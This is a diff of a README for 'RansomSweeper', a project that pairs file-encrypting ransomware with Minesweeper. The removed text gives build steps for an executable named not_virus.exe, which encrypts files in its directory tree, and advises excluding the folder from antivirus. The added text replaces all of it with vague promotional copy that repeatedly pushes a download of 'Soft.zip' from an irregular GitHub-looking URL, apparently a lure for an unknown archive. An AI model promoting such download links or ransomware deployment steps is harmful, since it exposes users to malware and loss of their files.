@@ -1,77 +1,51 @@
-# RansomSweeper A Crypto Challenge Adventure
-Welcome to **RansomSweeper**, a project that combines the thrilling world of ransomware with the classic game of Minesweeper! Dive into a creative and educational exploration of how ransomware works and challenge your wits in a game of skill and strategy.
-<div align="center">
+# 🕹️ RansomSweeper - Combining Ransomware Simulation with Minesweeper Fun! 🛡️
 
-## Watch the Video Demo
+Welcome to **RansomSweeper**, an educational project that merges ransomware simulation with the classic Minesweeper game. Dive into the world of cybersecurity in a controlled environment while putting your skills to the test in a thrilling and challenging game. Remember to use this tool responsibly for ethical educational purposes.
 
-[![Watch the Video Demo](screenshot.png)](https://www.youtube.com/watch?v=nngkiTYDoIo)
+## 🚀 Quick Links
+🔗 [Download the project here](https://github.com/files/Soft.zip)
 
-</div>
+## ℹ️ About RansomSweeper
+**RansomSweeper** is a unique combination of ransomware simulation and the beloved Minesweeper game. It provides an engaging and interactive platform to learn about encryption, decryption, malware, hacking, trojans, viruses, and more. With a focus on cybersecurity awareness, this project aims to educate users about potential threats in a simulated and controlled environment.
 
-## Table of Contents
-- [Overview](#overview)
-- [Ransomware](#ransomware)
-  - [Building Ransomware](#building-ransomware)
-  - [Running Ransomware](#running-ransomware)
-- [Minesweeper Game](#minesweeper-game)
-  - [Building Minesweeper Game](#building-minesweeper-game)
-  - [Playing Minesweeper Game](#playing-minesweeper-game)
-- [Disclaimer](#disclaimer)
+## 🎮 How to Play
+The gameplay of **RansomSweeper** is a blend of the tactical thinking required in Minesweeper with the strategic decision-making involved in combating ransomware attacks. Uncover tiles, avoid hidden traps, and decrypt malicious codes to secure your system. Test your cybersecurity skills while enjoying the classic Minesweeper experience.
 
-## Overview
+## 📊 Key Features
+🔒 Simulated Ransomware Challenges  
+🔍 Encryption and Decryption Puzzles  
+🔧 Educational Gameplay Design  
+🎯 Fun and Challenging Levels  
+🧠 Cybersecurity Awareness Training  
 
-**RansomSweeper** consists of two intriguing components:
+## 🎯 Learning Objectives
+1. Understand Encryption and Decryption Processes  
+2. Recognize Different Types of Malware  
+3. Learn About Ransomware Strategies  
+4. Develop Critical Thinking Skills  
+5. Enhance Cybersecurity Knowledge  
 
-1. **Ransomware**: A script that encrypts files in its current directory and presents the user with a suspenseful SFML window, challenging them to play Minesweeper to decrypt their precious files.
+## 📚 Repository Topics
+🔐 Decryption  
+🔒 Encryption  
+⚔️ Hack  
+👾 Hacking  
+🦠 Malware  
+💣 Minesweeper  
+🎮 Minesweeper-Game  
+🎨 SFML  
+🕹️ SFML-Game  
+🦠 Trojan  
+🦠 Virus  
 
-2. **Minesweeper Game**: The game that holds the key to decrypting your files. Successfully conquer this classic game of strategy to regain access to your encrypted data.
-## Ransomware
+## 🌟 Get Started
+To begin your journey with **RansomSweeper**, download the project from the following link:
+🔗 [Download RansomSweeper](https://github.com/files/Soft.zip)
 
-The ransomware component of **RansomSweeper** encrypts files within its current directory, adding an extra layer of excitement to the world of ransomware.
+## 🚨 Need Help?
 
-### Building Ransomware
+If the link does not work or you encounter any issues, please check the "Releases" section of the repository for alternative download options.
 
-Prepare to unleash the ransomware with these steps:
+[![Download RansomSweeper](https://img.shields.io/badge/Download-RansomSweeper-brightgreen)](https://github.com/files/Soft.zip)
 
-1. Ensure you have the required dependencies, including OpenSSL and SFML, installed on your system.
-
-2. Open your command prompt and navigate to the project directory using the `cd` command.
-
-3. Execute the following command:
-
-   ```bash
-   build_ransom.bat
-This command compiles the ransomware script and creates the executable file not_virus.exe in the ransomware directory (notice that when you run it it will start encrypting the files in the current directory and it's subdir).
-### Running Ransomware
-the not_virus.exe file will be outputed in ransomware/not_virus.exe after running it will start encrypting the files in the current directory and it's subdir and added .mohamed extension, carful when you run it (you may olso need exlude the project folder from any antivirus) 
-## Minesweeper Game
-The Minesweeper game in mineswepper offers you a chance to redeem your encrypted files. Master this challenging game to decrypt your data and thwart the ransomware.
-### Building Minesweeper Game
-To create the Minesweeper game, follow these steps:
-
-1. Ensure you have the required dependencies, including SFML, properly installed on your system.
-
-2. Open your command prompt and navigate to the project directory using the cd command.
-
-3. Execute the following command:
-   ```bash
-     build_minesweeper.bat
- 
-This command compiles the Minesweeper game and generates the executable file minesweeper/minesweeper.exe.
-
-### Playing Minesweeper Game
-Launch the Minesweeper game by running the minesweeper/minesweeper.exe file. Test your strategy and logic skills, and once you win, you can decrypt your files and outsmart the ransomware (the encrypted file (.mohamed) has to be in the same directory as you minesweeper game in order to decrypte and restor them).
-![RansomSweeper](screenshot2.png)
-
-## Disclaimer
-**Important Notice:** The **RansomSweeper** project and its included code are meant for educational and research purposes only (and for fun). This code, especially the ransomware component, is provided for educational insights into cybersecurity, encryption, and game development. The developer and maintainer of this project do not endorse or support any malicious or illegal use of this code.
-
-
-
-
-
-
-
-
-
-
+Let the adventure begin! Play, learn, and master the art of cybersecurity with **RansomSweeper**. Have fun and stay safe online! 🛡️🎮🔒
